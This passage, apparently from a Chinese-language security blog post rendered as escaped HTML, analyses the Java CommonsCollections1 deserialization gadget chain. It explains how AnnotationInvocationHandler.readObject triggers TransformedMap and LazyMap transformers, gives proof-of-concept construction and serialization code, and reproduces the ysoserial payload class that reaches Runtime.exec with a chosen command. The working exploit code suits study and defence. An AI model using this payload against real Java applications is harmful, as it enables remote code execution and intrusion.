&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!(&lt;/span>&lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">ExceptionProxy&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setValue&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AnnotationTypeMismatchExceptionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;[&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">setMember&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Method&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">members&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>代码比较好看懂，先是得到前面传入的Map（我们传入经过TransformedMap修饰的对象），之后依次遍历，到了&lt;code>setValue&lt;/code>时会触发transform的回调&lt;/p>
&lt;p>所以我们构造POC时需要创建&lt;code>AnnotationInvocationHandler&lt;/code>对象，并把前面的&lt;code>HashMap&lt;/code>传进来作为Map参数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同时因为AnnotationInvocationHandler是内部类不能直接new，我们用反射+setAccessible(true)的方式实例化；并且由于&lt;code>Runtime.getRuntime&lt;/code>没有实现序列化的接口，所以我们用反射获取当前上下文的Runtime对象&lt;/p>
&lt;p>另外，为了满足readObject中的&lt;code>var7!=null&lt;/code>的判断，要满足&lt;/p>
&lt;ul>
&lt;li>&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>构造函数的第一个参数为Annotation的子类，且必须至少含有一个方法，假设方法名为X&lt;/li>
&lt;li>被&lt;code>TransformedMap.decorate&lt;/code>修饰的Map中必有一个键名为X的元素&lt;/li>
&lt;/ul>
&lt;p>8u71之后的版本修改了&lt;code>AnnotationInvocationHandler&lt;/code>的readObject函数，不再使用反序列化得到的Map对象，而是新建了LinkedHashMap对象，把原来的key-value添加进去，所以后续对Map的操作都是基于这个&lt;code>LinkedHashMap&lt;/code>对象，不会再触发set或put了&lt;/p>
&lt;p>最后把对象生成序列化流&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="lazymap">LazyMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Authors&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Dependencies&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.PayloadTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Gadgets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.JavaVersion&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.PayloadRunner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Reflections&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Map(Proxy).entrySet()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ConstantTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Class.getMethod()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.getRuntime()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Requires:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> commons-collections
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@PayloadTest&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">precondition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;isApplicableJavaVersion&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Dependencies&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;commons-collections:commons-collections:3.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Authors&lt;/span>&lt;span style="color:#f92672">({&lt;/span> &lt;span style="color:#111">Authors&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FROHOFF&lt;/span> &lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections1&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">PayloadRunner&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">execArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// inert chain for setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// real chain for after setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">execArgs&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">lazyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">mapProxy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoitizedProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lazyMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoizedInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mapProxy&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// arm with actual transformer chain
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">CommonsCollections1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
